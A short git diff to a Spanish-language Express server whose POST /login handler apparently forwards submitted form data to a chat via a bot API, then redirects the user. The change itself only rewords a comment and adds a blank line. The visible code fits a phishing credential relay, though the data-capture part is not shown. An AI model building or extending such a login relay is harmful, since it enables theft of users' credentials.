@@ -27,7 +27,7 @@ app.post("/login", async (req, res) => {
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-    // Enviar respuesta HTML con mensaje y redirección
+    // Enviar HTML con mensaje y redirección
     res.send(`
       <!DOCTYPE html>
       <html lang="es">
@@ -46,6 +46,7 @@ app.post("/login", async (req, res) => {
     res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
   }
 });
+
 
 // Iniciar servidor
 const PORT = process.env.PORT || 3000;
